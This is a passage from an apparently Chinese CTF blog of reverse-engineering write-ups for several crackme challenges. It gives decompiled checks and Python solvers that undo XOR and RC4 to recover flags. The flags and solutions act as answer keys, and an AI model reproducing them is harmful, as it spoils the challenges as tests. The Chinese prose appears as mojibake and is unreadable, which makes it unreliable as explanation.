class="line">She_P1ay_Black_Hole_Very_Wel1!LOL!XD!</span><br></pre></td></tr></table></figure><p>c#ï¼Œå‡ç­”æ¡ˆï¼ŒDESï¼Œbase64ï¼ŒCEï¼Œmono</p><hr><h1>NSSCTF</h1><h2 id="wordy">wordy</h2><p>æ‰“å¼€idaåå‘ç°æ²¡æœ‰mainå‡½æ•°ï¼Œstarté‡Œé¢æ ‡çº¢ï¼Œæ€€ç–‘æœ‰èŠ±æŒ‡ä»¤ï¼Œåˆ°æ±‡ç¼–ä¸­æŸ¥æ‰¾mainï¼Œç”¨<code>alt+t</code>é”®ï¼Œæ‰¾åˆ°åï¼š</p><p><img src="https://s2.loli.net/2023/12/15/542PxaSHyIoe3df.png" alt="image-20231215105547630"></p><p>å‘ç°ç¡®å®æ˜¯èŠ±æŒ‡ä»¤ï¼Œå…ˆuï¼Œå†è·³ä¸€ä¸ªæ•°æ®cï¼Œå¤šæ¥å‡ æ¬¡ï¼Œå°±ä¼šå‘ç°åƒåœ¾æ•°æ®æ˜¯0EBhï¼ŒåŒæ—¶æ¯ä¸¤ä¸ªebä¹‹é—´éƒ½æœ‰putcharæŒ‡ä»¤è¾“å‡ºä¸€ä¸ªå­—ç¬¦ï¼Œç”±äº0XEBæ˜¯ä¸å¯è§çš„æ‰€ä»¥ï¼Œæ‰“å¼€hexçª—å£åªä¼šç•™ä¸‹putcharçš„å­—ç¬¦ï¼š</p><p><img src="https://s2.loli.net/2023/12/15/MOCnBqmFXe4tGZu.png" alt="image-20231215110118700"></p><p>å¾—flag:GFCTF{u_are2wordy}</p><p>èŠ±æŒ‡ä»¤ï¼Œhexï¼Œè„šæœ¬</p><hr><h1>ganctf 2023</h1><h2 id="py-python">py?python!</h2><p>æ‰“å¼€æ–‡ä»¶ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted_data = []</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        encrypted_data.append(<span class="built_in">ord</span>(data[i]) ^ <span class="built_in">ord</span>(key[i % key_len]))</span><br><span class="line">    <span class="keyword">return</span> encrypted_data[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = [<span class="number">19</span>, <span class="number">78</span>,<span class="number">6</span> , <span class="number">68</span>, <span class="number">17</span>, <span class="number">36</span>, <span class="number">23</span>,<span class="number">63</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">51</span>, <span class="number">38</span>, <span class="number">41</span>, <span class="number">95</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">71</span>, <span class="number">43</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">29</span>, <span class="number">40</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">96</span></span><br><span class="line">, <span class="number">55</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">21</span>,<span class="number">54</span>]</span><br><span class="line">key = <span class="string">&quot;Python&quot;</span></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥flag&quot;</span>)</span><br><span class="line">encrypted_data = encrypt(flag, key)</span><br><span class="line"><span class="keyword">if</span> encrypted_data == data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Good!You find it&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sorry,Try again&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾ˆç®€å•çš„åŠ å¯†ç®—æ³•ï¼Œç›´æ¥é€†å‘å³å¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">last = [<span class="number">19</span>, <span class="number">78</span>,<span class="number">6</span> , <span class="number">68</span>, <span class="number">17</span>, <span class="number">36</span>, <span class="number">23</span>,<span class="number">63</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">15</span>, <span class="number">42</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">51</span>, <span class="number">38</span>, <span class="number">41</span>, <span class="number">95</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">71</span>, <span class="number">43</span>, <span class="number">15</span>, <span class="number">93</span>, <span class="number">29</span>, <span class="number">40</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">96</span></span><br><span class="line">, <span class="number">55</span>, <span class="number">20</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">21</span>,<span class="number">54</span>]</span><br><span class="line">key = <span class="string">&quot;Python&quot;</span></span><br><span class="line">last =last[::-<span class="number">1</span>]</span><br><span class="line">be = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">        be += (<span class="built_in">chr</span>((last[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])))</span><br><span class="line"><span class="built_in">print</span>(be)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_@r3_R3@l1y_G0OD_@t_Pyth0n!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Ezmaze">Ezmaze</h2><p>æ‰“å¼€idaï¼Œæ£€æŸ¥mainï¼ŒåŒ–ç®€åå¤§æ¦‚æ˜¯ï¼š</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="function">__fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> path[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-B0h] BYREF</span></span><br><span class="line">  __int64 tab[<span class="number">5</span>]; <span class="comment">// [rsp+90h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [rsp+B8h] [rbp-18h]</span></span><br><span class="line">  __int64 check; <span class="comment">// [rsp+BCh] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> b; <span class="comment">// [rsp+C4h] [rbp-Ch]</span></span><br><span class="line">  __int64 a; <span class="comment">// [rsp+C8h] [rbp-8h]</span></span><br><span class="line"><span class="keyword">int</span> ch1,ch2;</span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  qmemcpy(tab, <span class="string">&quot;@01111010110011110011110100#01&quot;</span>, <span class="number">30</span>);</span><br><span class="line">  a = <span class="number">0</span>i64;</span><br><span class="line">  <span class="comment">//puts(&amp;Buffer);                                // å¯æ€œçš„çŒ«çŒ«åœ¨è¿·å®«é‡Œè¿·è·¯äº†,ä½ èƒ½æ‰¾åˆ°å®ƒåœ¨å“ªå—ï¼Ÿ</span></span><br><span class="line">  <span class="comment">//puts(&amp;byte_40402C);                           // è¯·è¾“å…¥è·¯å¾„,æ‰¾åˆ°çŒ«çŒ«</span></span><br><span class="line">  gets(path);</span><br><span class="line">  len = strlen(path);</span><br><span class="line">  b = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    check = a;</span><br><span class="line">    c = path[b];</span><br><span class="line">    <span class="keyword">if</span> ( c == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ch2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">( c &gt; <span class="number">100</span> )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> ( c == <span class="number">115</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ch1++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">( c == <span class="number">119</span> )</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">        ch1--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">else</span> <span class="title">if</span> <span class="params">( c == <span class="number">97</span> )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      ch2--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( ++b &gt; len</span><br><span class="line">      || ch1 &gt; <span class="number">5</span></span><br><span class="line">      || (unsigned <span class="keyword">int</span>)check &gt; <span class="number">4</span></span><br><span class="line">      || (tab[<span class="number">5</span>*ch1+ch2]) != <span class="string">&#x27;0&#x27;</span></span><br><span class="line">      &amp;&amp; (tab[<span class="number">5</span>*ch1+ch2]) != <span class="string">&#x27;@&#x27;</span></span><br><span class="line">      &amp;&amp; (tab[<span class="number">5</span>*ch1+ch2]) != <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a = check;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)tab + <span class="number">5</span> * HIDWORD(a) + (<span class="keyword">int</span>)a) == <span class="string">&#x27;#&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//puts(&amp;byte_404040);</span></span><br><span class="line">    <span class="comment">//system(&quot;Pause&quot;);                            // æˆåŠŸ</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//printf(&amp;Format);                            // å¤±è´¥</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//system(&quot;Pause&quot;);</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æcheckçš„å€¼å¯çŸ¥å®ƒçš„é«˜32ä½å‚¨å­˜çºµæ–¹å‘æ•°å€¼ï¼Œä½32ä½å‚¨å­˜æ¨ªæ–¹å‘æ•°å€¼ï¼Œa,wä¸ºå‡sdä¸ºåŠ ã€‚è·³å‡ºå¾ªç¯æ¡ä»¶è¡¨æ˜è‡³å°‘s5æ¬¡ï¼Œd4æ¬¡ï¼ŒæŠŠtabæ”¹æˆè¿·å®«ï¼š</p><blockquote><p>@0111</p><p>10101</p><p>10011</p><p>11001</p><p>11101</p><p>00#01</p></blockquote><p>å¯å¾—@ä¸ºå¼€å§‹ä½ç½®ï¼Œ#ä¸ºæœ«ä½ç½®</p><p>dssdsdssaå³å¯ï¼ˆä½†æ˜¯dä¹Ÿæ²¡æœ‰4æ¬¡å‘€ï¼Ÿå¥‡æ€ªï¼‰</p><p>flag{dssdsdssa}</p><p>é€†å‘åˆ†æï¼Œæ­£å‘æ±‚è§£</p><hr><h2 id="easy-xor">easy_xor</h2><p>è¿™ä¸ªé¢˜ä¹Ÿå¾ˆç®€å•ï¼Œidaåˆ†æåï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">_main();</span><br><span class="line">*(_QWORD *)enc = <span class="number">0x6E6E717F64636D66</span>i64;</span><br><span class="line"><span class="built_in">strcpy</span>(&amp;enc[<span class="number">8</span>], <span class="string">&quot;&#123;V;xSLQi|pun&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the flag: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) != <span class="number">20</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid flag length! Exiting...&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(flag); ++j )</span><br><span class="line">  flag[j] ^= j;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(flag, enc) )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>ç›´æ¥åŠ¨æ€è°ƒè¯•æ‰¾encçš„åœ°å€å¼‚æˆ–</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(get_wide_byte(<span class="number">0x62FDF0</span>+i)^i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)] ))</span><br><span class="line"><span class="comment">#flag&#123;this_1s_A_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="easy-upx">easy_upx</h2><p>è¿™ä¸ªåœ¨upxå®˜æ–¹çš„è„±å£³è½¯ä»¶è„±å£³åæ‰“å¼€mainè½¬æ¢å­—ç¬¦ä¸²å³å¯ï¼Œæˆ–ç›´æ¥æ‰“å¼€hexè§†å›¾ï¼š</p><p>flag{UXP_yyds!}</p><p>UPXï¼Œhex</p><hr><h2 id="try-reverse-it">try_reverse_it</h2><p>æœ‰ä¸€ä¸ªupxå£³ï¼Œå…ˆè„±æ‰ï¼Œç„¶åè¿›å…¥mainæŸ¥çœ‹ï¼š</p><p>å‘ç°æ˜¯rc4åŠ å¯†ï¼Œä¹‹å‰æ²¡æœ‰å­¦è¿‡ï¼Œæ‰€ä»¥ç°å­¦ï¼š</p><p>æ•´ä¸ªåŠ å¯†åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š</p><ul><li>åˆå§‹åŒ–ï¼ŒSç›’åˆå§‹åŒ–ä¸ºé¡ºåºçº¿æ€§åˆ—è¡¨ï¼Œç”¨å·²çŸ¥çš„keyå¡«æ»¡Tç›’å¦‚æœkeyé•¿åº¦å°äºTç›’å¤§å°ï¼Œå°±ä¸€ç›´é‡å¤ç›´åˆ°å¡«æ»¡</li><li>æ··ä¹±åŒ–ï¼šåœ¨å¾ªç¯ä¸­ï¼ŒæŠŠç¬¬iä½çš„Så’Œä¸€ä¸ªç”±è¿™ä¸ªSå’ŒTç›’ç”Ÿæˆçš„ç®—æ³•è®¡ç®—å‡ºçš„S[j]äº¤æ¢</li><li>ç”¨æ··ä¹±åŒ–ä¹‹åçš„Sç›’å’Œflagè¿›è¡ŒåŠ å¯†iæ¬¡æ¯æ¬¡å–1ä½,ç”±äºrc4åŠ å¯†æ˜¯å¯¹ç§°çš„æ‰€ä»¥ä¸€èˆ¬ç”¨å¼‚æˆ–,åŒæ—¶æ¯æ¬¡åŠ å¯†ä¼šåŒæ—¶äº¤æ¢ç”±S[i]å˜æ¢çš„æ¥çš„S[j]äº¤æ¢,æ‰€ä»¥æ¯æ¬¡åŠ å¯†éƒ½æ˜¯åœ¨ä¸Šä¸€æ¬¡åŸºç¡€ä¸Šå®Œæˆçš„</li></ul><p>è€Œè¿™é“é¢˜ä¹Ÿåªæ˜¯æŠŠæ¯ä¸€ä½flagå’Œé‚£ä¸€ä½è®¡ç®—çš„Så¼‚æˆ–,æ‰€ä»¥å®Œå…¨å¯ä»¥é¡ºç€å…ˆæŠŠSç›’æ±‚å‡ºæ¥,æ ¹æ®å¼‚æˆ–çš„æ€§è´¨ç›´æ¥æŠŠæœ€åçš„å€¼å¼‚æˆ–å¾—åˆ°ç­”æ¡ˆ</p><p>è¡¥å……ä¸€ä¸ªç»†èŠ‚:ä¹‹å‰æˆ‘å†™çš„è„šæœ¬:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    t.join(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªéƒ½æ˜¯é”™è¯¯çš„,ç¬¬ä¸€ä¸ªçš„t.join(chr(flag[i]))æ„æ€æ˜¯è¿”å›<code>æŠŠåæ–¹ä¼ å…¥çš„åˆ—è¡¨å˜æˆä¸€ä¸ªå­—ç¬¦ä¸²é—´éš”å­—ç¬¦æ˜¯t</code>çš„å­—ç¬¦ä¸²,ä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰ç”¨å­—ç¬¦ä¸²æ¥æ”¶è¿™ä¸ªè¿”å›å€¼,å¯¼è‡´æ²¡æœ‰æ”¹å˜</p><p>ç¬¬äºŒä¸ªæ˜¯å› ä¸ºâ€™'.joinæ¯æ¬¡éƒ½ä¼šåˆå§‹åŒ–t,æ”¹æˆ+=å°±å¥½äº†</p><p>exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x6C</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x27</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, </span><br><span class="line">       <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x69</span>, <span class="number">0x74</span>]</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x6C</span>, <span class="number">0xF8</span>, <span class="number">0x90</span>, <span class="number">0xFF</span>, <span class="number">0x8B</span>, <span class="number">0x18</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0x76</span>, <span class="number">0xB5</span>, <span class="number">0xFB</span>, <span class="number">0x50</span>, <span class="number">0xF5</span>, </span><br><span class="line">        <span class="number">0x2C</span>, <span class="number">0x5F</span>, <span class="number">0xF3</span>, <span class="number">0x10</span>, <span class="number">0xCB</span>, <span class="number">0x3E</span>, </span><br><span class="line">        <span class="number">0xEA</span>, <span class="number">0x9A</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, </span><br><span class="line">        <span class="number">0xCC</span>, <span class="number">0x8F</span>, <span class="number">0x21</span>, <span class="number">0x29</span>, <span class="number">0x17</span>, <span class="number">0x06</span>, </span><br><span class="line">        <span class="number">0xCA</span>, <span class="number">0x67</span>]</span><br><span class="line"><span class="comment">#åˆå§‹åŒ–T,S</span></span><br><span class="line">S = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">256</span>):</span><br><span class="line">    S[<span class="number">255</span>-i] = i</span><br><span class="line">T = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    T[i] = key[i % <span class="built_in">len</span>(key)]</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰“ä¹±S</span></span><br><span class="line">a = b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    a = S[i]</span><br><span class="line">    b = (a+T[i]+b) % <span class="number">256</span></span><br><span class="line">    S[i] = S[b]</span><br><span class="line">    S[b] = a</span><br><span class="line"><span class="comment">#Sç›’åˆå§‹åŒ–æˆåŠŸ,å¼‚æˆ–ç®—æ³•ç›¸åŒï¼Œæ‰€ä»¥ç›¸å½“äºå†æ¥ä¸€æ¬¡</span></span><br><span class="line">m = n = <span class="number">0</span></span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">32</span>):</span><br><span class="line">    m = (m + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    k = S[m]</span><br><span class="line">    n = (k+n) % <span class="number">256</span></span><br><span class="line">    S[m] = S[n]</span><br><span class="line">    S[n] = k</span><br><span class="line">    flag[i] = last[i] ^ S[(k + S[m]) % <span class="number">256</span>]</span><br><span class="line">t =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    t +=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(flag[i]))</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_5eem_1ike4pro_revers3r&#125;</span></span><br></pre></td></tr></table></figure><p>UPXï¼ŒRC4</p><h2 id="BrownFox">BrownFox</h2><p>idaç›´æ¥æ‰“å¼€,å…ˆåŠ¨æ€è°ƒè¯•æŠŠimprovefoxå‡½æ•°ä¹‹åçš„foxæ‹¿å‡ºæ¥,å†æŠŠæœ€åçš„æ£€æµ‹å‡½æ•°æ‹¿å‡ºæ¥,å˜æ¢å…¨åœ¨tofoxé‡Œé¢æ‰€ä»¥è¯¦ç»†çœ‹tofox,åŒ–ç®€ä¹‹å:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i != num;i++ )</span><br><span class="line">  &#123;</span><br><span class="line">    k = flag[i] &gt;&gt; <span class="number">3</span>;<span class="comment">//kæœ€å¤§15å¾—å‰4ä½</span></span><br><span class="line">    check[<span class="number">2</span> * i] = fox[flag[i] &amp; <span class="number">7</span>];<span class="comment">//æœ€å¤§7å¾—åä¸‰ä½</span></span><br><span class="line">    check[<span class="number">2</span> * i+ <span class="number">1</span>] = fox[k]</span><br><span class="line">  &#125;</span><br><span class="line">check += <span class="number">2</span> * num;</span><br><span class="line">*check = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å˜æ¢æ˜¯éè¿ç»­æ€§çš„æ‰€ä»¥k&lt;&lt;3+check[2*i]åœ¨foxä¸­çš„ä½ç½®å¯å¾—flag</p><p>æ³¨:foxä¸€å¼€å§‹æ˜¯æœ‰é‡å¤å­—ç¬¦çš„,ä½†æ˜¯åœ¨improvefoxä¹‹åæ²¡æœ‰äº†</p><p>æœ€ååˆè¢«å‘äº†,æ³¨æ„pythonä¸­ä½ç§»ä¼˜å…ˆåº¦ä½äºÂ±,å¼‚æˆ–ä¹Ÿæ˜¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">fox = [<span class="number">0x41</span>, <span class="number">0x71</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x72</span>, </span><br><span class="line">       <span class="number">0x6F</span>, <span class="number">0x77</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x6A</span>, <span class="number">0x31</span>, </span><br><span class="line">       <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x74</span>, </span><br><span class="line">       <span class="number">0x68</span>, <span class="number">0x34</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x64</span>, <span class="number">0x35</span>, </span><br><span class="line">       <span class="number">0x67</span>]</span><br><span class="line">sng = [<span class="number">0x62</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0x78</span>, <span class="number">0x71</span>, <span class="number">0x30</span>, <span class="number">0x72</span>, <span class="number">0x30</span>, </span><br><span class="line">       <span class="number">0x69</span>, <span class="number">0x31</span>, <span class="number">0x71</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x62</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, </span><br><span class="line">       <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0x62</span>, <span class="number">0x78</span>, <span class="number">0x72</span>, <span class="number">0x78</span>, </span><br><span class="line">       <span class="number">0x72</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6F</span>, <span class="number">0x41</span>, <span class="number">0x6F</span>, </span><br><span class="line">       <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x30</span>, <span 